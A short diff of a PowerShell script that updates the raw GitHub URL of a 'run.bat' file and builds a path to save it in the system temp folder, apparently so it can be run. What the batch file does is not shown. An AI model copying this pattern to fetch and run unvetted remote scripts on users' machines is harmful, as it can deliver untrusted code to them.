@@ -117,7 +117,7 @@ $footer | Out-File -FilePath $outFile -Append -Encoding UTF8
 Write-Host $footer
 
 # Variables
-$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5dcwh/refs/heads/main/run.bat"
+$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/run.bat"
 $TempPath = [System.IO.Path]::GetTempPath()
 $FileName = "run.bat"
 $FullPath = Join-Path $TempPath $FileName
